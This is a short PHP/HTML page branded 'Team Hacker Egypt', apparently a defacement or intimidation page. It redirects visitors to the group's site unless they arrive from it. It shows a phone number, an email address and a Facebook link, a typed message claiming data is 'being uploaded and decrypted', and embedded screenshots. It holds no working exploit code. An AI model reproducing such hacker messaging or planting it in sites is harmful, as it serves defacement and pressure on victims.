<?php
if ($_SERVER['HTTP_REFERER'] == 'https://teamhackeregypt.azurewebsites.net/index.php') {
    
} else {
    header("Location: https://teamhackeregypt.azurewebsites.net/index.php");
}


?>
<!DOCTYPE html>
<html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Document</title>
        <style>
            h3{color:red;
            font-size:large;
            font-weight:bold;
            text-align:center}
        </style>
        
    </head>

    <body>
        <div>
            <h1 style="text-align:center">
                Team Hacker Egypt
            </h1>
    <h3>
    +20 01020111745

            </h3>
            <h3> gmail:: m0haba.abdu0@gmail.com
            </h3>
            



            <p id="demo" style="text-align:center" class="demo"> </p>

            <script>
            var i = 0;
            var txt =
                'Data is being uploaded and decrypted now please wait till finish or contact team hacker egypt admin from here  ';
            var speed = 50;

            function typeWriter() {
                if (i < txt.length) {
                    document.getElementById("demo").innerHTML += txt.charAt(i);
                    i++;
                    setTimeout(typeWriter, speed);
                }
            }

            window.onload = typeWriter();
            </script>
            <a href="https://www.facebook.com/team.hacker.egypt.official">Team Hacker Egypt</a>
            <img src="https://www.mediafire.com/file/yv0v1gwwdrnnahn/Screenshot+from+2023-04-26+20-56-03.png/file">
            <img src="">
            <img src="https://www.mediafire.com/file/yv0v1gwwdrnnahn/Screenshot+from+2023-04-26+20-56-03.png/file">
            <img src="https://www.mediafire.com/file/6diuikgpue8ckmu/Screenshot+from+2023-04-26+20-01-23.png/file">
            <img src="https://www.mediafire.com/file/zth1f9yaiybde3x/Screenshot+from+2023-04-26+20-01-28.png/file">
            <img src="https://www.mediafire.com/file/e3ibhsihuxhrbp3/Screenshot+from+2023-04-26+20-55-54.png/file">
            
    </body>

</html>
